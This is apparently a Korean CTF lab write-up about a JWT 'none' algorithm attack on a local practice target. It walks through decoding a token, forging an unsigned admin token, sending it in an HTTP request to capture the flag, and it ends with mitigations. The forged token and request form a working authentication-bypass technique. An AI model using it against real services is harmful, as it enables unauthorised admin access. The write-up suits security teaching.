+++
title = "VulnABLE CTF [LUXORA]: JWT Attacks 🥉 Bronze (None Algorithm)"
description = "LUXORA 플랫폼의 JSON Web Token(JWT) 'None' 알고리즘 취약점을 이용한 관리자 권한 탈취 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "JWT", "Bronze", "Authentication"]
+++

# VulnABLE CTF [LUXORA]: JWT Attacks 🥉 Bronze

현대 웹 애플리케이션에서 세션(Session) 대신 가장 널리 쓰이는 인증 방식이 바로 **JWT (JSON Web Token)**입니다. JWT는 클라이언트 측에 저장되지만, 강력한 암호학적 서명(Signature)을 통해 위변조를 막습니다.

하지만 개발자의 설정 실수로 인해 이 서명 검증 과정 자체가 무력화될 수 있습니다. 이번 시나리오(`/jwt/bronze`)에서는 가장 유명하고 치명적인 JWT 취약점인 **'None' 알고리즘 공격**을 실습해 보겠습니다.

---

## 🕒 1. 타겟 탐색 및 토큰 획득 (Reconnaissance)

웹 브라우저의 개발자 도구(F12)를 열고 `Application` 탭의 `Cookies` 또는 `Local Storage`를 확인합니다. 
일반 사용자 계정으로 로그인한 상태에서 제 발급받은 JWT를 발견했습니다.

**[획득한 JWT (예시)]**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiZ3Vlc3QifQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 🔍 토큰 구조 분석
JWT는 점(`.`)을 기준으로 세 부분(Header, Payload, Signature)으로 나뉩니다.
이를 Base64로 디코딩해봅니다. (온라인 툴 jwt.io 등을 활용)

1. **Header**: `{"alg":"HS256","typ":"JWT"}` (HMAC-SHA256 알고리즘 사용)
2. **Payload**: `{"username":"user","role":"guest"}` (내 권한이 guest임)
3. **Signature**: 서버만 아는 비밀키로 생성된 서명.

**[해커의 사고 과정]**
* 내 `role`이 `guest`로 되어 있다. 이 부분을 `admin`으로 바꾸면 관리자가 될 수 있을까?
* 페이로드를 Base64로 다시 인코딩해서 서버로 보내면, 서버는 Signature가 맞지 않다고(위조되었다고) 거부할 것이다.
* 그런데 만약 서버가 **서명 검증 자체를 안 하도록** 속일 수 있다면?

---

## 🕒 2. 취약점 식별 및 토큰 조작 (Exploitation)

JWT의 표준 스펙에는 서명을 사용하지 않겠다는 뜻의 **`none` 알고리즘**이 존재합니다. 원래는 디버깅 목적으로 만들어졌으나, 서버의 JWT 라이브러리가 취약하게 설정되어 있으면 클라이언트가 헤더의 `alg`를 `none`으로 바꿔 보냈을 때 서명 검증을 패스해버리는 치명적 버그가 발생합니다.

### 💡 공격 원리: 토큰 위조 (Forging Token)

1. **헤더 조작**: `alg` 값을 `HS256`에서 `none`으로 변경합니다.
   * `{"alg":"none","typ":"JWT"}` ➔ Base64 인코딩: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
2. **페이로드 조작**: 권한을 관리자로 격상합니다.
   * `{"username":"admin","role":"admin"}` ➔ Base64 인코딩: `eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0`
3. **서명 제거**: `none` 알고리즘이므로 서명 부분은 비워둡니다. 하지만 마지막 점(`.`)은 반드시 남겨두어야 합니다.

**[최종 위조된 토큰]**
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```
*(주의: 맨 끝에 점이 하나 있어야 합니다)*

---

## 🕒 3. 권한 탈취 및 플래그 획득 🚩

Burp Suite의 Repeater 기능을 사용하거나 브라우저 쿠키값을 변조하여 서버의 보호된 라우트(`/jwt/bronze/admin`)에 접근합니다.

```http
GET /jwt/bronze/admin HTTP/1.1
Host: localhost:3000
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

### 🔍 공격 결과
서버는 헤더의 `alg`가 `none`인 것을 보고 서명 검증 로직을 건너뜁니다. 그리고 페이로드의 `role: admin`을 믿고 관리자 페이지의 내용을 렌더링해 줍니다!

```json
{
  "message": "Welcome Admin!",
  "flag": "FLAG{JWT_🥉_NONE_ALG_C3D4E5}"
}
```

**플래그 획득:** `FLAG{JWT_🥉_NONE_ALG_C3D4E5}`

---

## 🛡️ 방어 대책 (Mitigation)

'None' 알고리즘 공격은 JWT가 세상에 나온 초창기에 수많은 대형 IT 기업들을 무너뜨렸던 역사적인 취약점입니다.

1. **알고리즘 검증 강제**: 백엔드에서 토큰을 검증할 때, 클라이언트가 보낸 헤더의 `alg` 값을 무조건 믿어서는 안 됩니다. 서버 측 로직에 "반드시 `HS256` 또는 `RS256` 알고리즘만 허용한다"는 명시적인 화이트리스트 조건을 걸어야 합니다.
2. **안전한 라이브러리 사용**: 현재 사용 중인 대부분의 최신 JWT 라이브러리(jsonwebtoken 등)는 `none` 알고리즘을 기본적으로 거부하도록 패치되어 있습니다. 오래된 레거시 라이브러리를 사용 중이라면 반드시 최신 버전으로 업데이트해야 합니다.

다음 단계인 **Silver 🥈 난이도**에서는 서버가 `none` 알고리즘을 차단했을 때, 취약한 비밀키(Weak Secret Key)를 오프라인에서 크랙하여 정상적인 서명을 만들어내는 기법을 다루겠습니다!